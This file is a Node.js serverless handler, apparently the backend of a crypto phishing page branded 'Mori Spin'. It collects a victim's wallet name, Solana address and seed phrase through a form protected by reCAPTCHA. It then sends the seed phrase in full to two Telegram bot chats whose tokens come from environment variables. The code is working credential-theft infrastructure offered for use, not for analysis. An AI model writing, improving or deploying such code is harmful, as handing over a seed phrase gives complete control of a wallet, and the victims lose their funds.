const https = require('https');
const querystring = require('querystring');

const sendMessageToBot = (botToken, chatId, message) => {
    return new Promise((resolve, reject) => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const postData = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });

        const req = https.request(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, res => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    resolve(JSON.parse(body));
                } else {
                    reject(new Error(`Ошибка ответа от Telegram: ${res.statusCode}. Ответ: ${body}`));
                }
            });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
};

const verifyRecaptcha = (secret, response) => {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            secret: secret,
            response: response
        });

        const options = {
            hostname: 'www.google.com',
            port: 443,
            path: '/recaptcha/api/siteverify',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    reject(e);
                }
            });
        });

        req.on('error', (e) => reject(e));
        req.write(postData);
        req.end();
    });
};


exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: JSON.stringify({ message: 'Method Not Allowed' }) };
    }

    const { 
        BOT_TOKEN_1, CHAT_ID_1, 
        BOT_TOKEN_2, CHAT_ID_2, 
        RECAPTCHA_SECRET_KEY 
    } = process.env;

    if (!BOT_TOKEN_1 || !CHAT_ID_1 || !BOT_TOKEN_2 || !CHAT_ID_2 || !RECAPTCHA_SECRET_KEY) {
        console.error("Одна или несколько переменных окружения не настроены.");
        return {
            statusCode: 500,
            body: JSON.stringify({ message: "Ошибка конфигурации на стороне сервера." })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const { solAddress, wallet, seedPhrase } = data;
        const recaptchaResponse = data['g-recaptcha-response'];

        if (!solAddress || !wallet || !seedPhrase || !recaptchaResponse) {
            return {
                statusCode: 400,
                body: JSON.stringify({ message: "Отсутствуют необходимые данные, включая токен reCAPTCHA." })
            };
        }

        // --- Проверка reCAPTCHA ---
        const recaptchaVerification = await verifyRecaptcha(RECAPTCHA_SECRET_KEY, recaptchaResponse);
        if (!recaptchaVerification.success) {
            console.error('Ошибка верификации reCAPTCHA:', recaptchaVerification['error-codes']);
            return {
                statusCode: 400,
                body: JSON.stringify({ message: "Проверка reCAPTCHA не пройдена." })
            };
        }
        // -------------------------

        const escapeHTML = (str) => {
            if (typeof str !== 'string') return '';
            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        };

        const message = `
<b>🔔 Новая заявка | Mori Spin</b>

<b>Кошелёк:</b> ${escapeHTML(wallet)}
<b>SOL Адрес:</b> <code>${escapeHTML(solAddress)}</code>

<b>Сид фраза:</b>
<pre>${escapeHTML(seedPhrase)}</pre>
        `;

        const sendPromises = [
            sendMessageToBot(BOT_TOKEN_1, CHAT_ID_1, message),
            sendMessageToBot(BOT_TOKEN_2, CHAT_ID_2, message)
        ];

        await Promise.all(sendPromises);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Успешно отправлено в оба чата" })
        };

    } catch (error) {
        console.error('Ошибка выполнения функции:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: `Внутренняя ошибка сервера: ${error.message}` })
        };
    }
};